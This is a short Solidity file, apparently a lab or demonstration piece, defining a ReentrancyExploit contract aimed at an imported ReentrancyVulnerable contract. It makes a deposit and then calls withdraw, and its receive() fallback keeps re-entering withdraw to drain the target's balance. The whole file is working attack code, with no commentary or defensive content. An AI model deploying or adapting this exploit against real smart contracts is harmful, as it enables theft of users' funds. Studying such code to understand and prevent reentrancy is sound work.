// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ReentrancyVulnerable} from "./ReentrancyVulnerable.sol";

contract ReentrancyExploit {
    receive() external payable {
        uint256 remain = msg.sender.balance;
        if (remain > 0) {
            uint256 deposited = ReentrancyVulnerable(msg.sender).balances(address(this));
            uint256 withdrawAmount = deposited > remain ? remain : deposited;
            ReentrancyVulnerable(msg.sender).withdraw(withdrawAmount);
        }
    }

    function exploit(address vulnerableContract) external payable {
        require(msg.value > 0, "Must send some ether");

        ReentrancyVulnerable(vulnerableContract).deposit{value: msg.value}();
        ReentrancyVulnerable(vulnerableContract).withdraw(msg.value);
    }
}
